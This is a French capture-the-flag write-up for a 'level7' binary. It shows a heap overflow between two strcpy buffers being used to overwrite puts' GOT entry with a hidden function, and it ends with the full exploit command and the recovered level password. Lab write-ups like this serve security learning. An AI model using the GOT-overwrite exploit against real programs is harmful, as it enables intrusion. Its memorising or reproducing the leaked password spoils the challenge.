L'executable demande 2 arguments, les 2 arguments vont etre stocker dans 2 variable differentes via des strcpy.
Les strcpy ne sont pas proteger donc on peux supposer qu'un buffer overflow sera utiliser.

Analysons le main
4 malloc sont effectuer afin de preparer les arguments pour les strcpy
arg1 est copier dans 0x0804a018
arg2 est copier dans 0x0804a038
puis le fichier .pass de l'user8 est ouvert et le contenu est enregister dans une variable a l'adresse 0x8049960
enfin la fonction fini par un appel a puts@plt qui imprime "~~"

Via info functions dans gdb  on remarque uen fonction m non utiliser
cette fonction a l'adresse 0x080484f4 print le resultat de la fonction time ET notre variable 0x8049960 qui contien le .pass

On souhaite donc executer la fonction m apres l'appel du fopen dans main
On peux supposer que l'appel de puts@plt est vulnerable en utilisant un overwrite du GOT en remplacant l'addresse de puts() par m()

Etant donner que malloc est utiliser pour les arguments des strcpy regardons leurs adr via  ltrace
--ltrace ./level7 aaaa aaaa
malloc(8)                    = 0x0804a008 (1)
malloc(8)                    = 0x0804a018 (2)
malloc(8)                    = 0x0804a028 (3)
malloc(8)                    = 0x0804a038 (4)
strcpy(0x0804a018, "aaaa")   = 0x0804a018 (1 -> 2)
strcpy(0x0804a038, "aaaa")   = 0x0804a038 (3 -> 4)

si on segfault en aggrandisant (1) on remarque:
--ltrace ~/level7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaa
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")  = 0x0804a018
strcpy(0x61616161, "aaaa" <unfinished ...>

Le programme segfault car notre argument (1) stocker a 0x0804a008 a overwrite notre argument (3) a 0x0804a028

En trouvant l'offset ( qui est de 0x20 ) on peut manipuler l'addresse de destination du 2eme strcpy afin d'y mettre ce que l'on souhaite grace a (4) a l'endroit 0x0804a038

Encore une fois utilisons des pattern pour trouver l'offset et nous simplifier la vie:
-- ltrace ~/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab AAAA
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, "AAAA" <unfinished ...>

0x37614136 --> 20

verifions cela
-- ltrace ./level7 `python -c "print('A'*20 + 'BBBB')"` AAAA
strcpy(0x42424242, "AAAA" <unfinished ...>

Cela fonctionne, maintenant nous pouvons chercher l'addresse ou est stocker notre fonction puts et la remplacer par notre fonction m

-- readelf -r ./level7
08049928  00000607 R_386_JUMP_SLOT   00000000   puts

0x08049928 est notre emplacement et l'addresse de m est 0x080484f4

Maintenant que nous avons tous nous pouvons essayer d'executer m
-- ./level7 `python -c "print('A'*20 + '\x28\x99\x04\x08')"` `python -c "print('\xf4\x84\x04\x08')"`

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

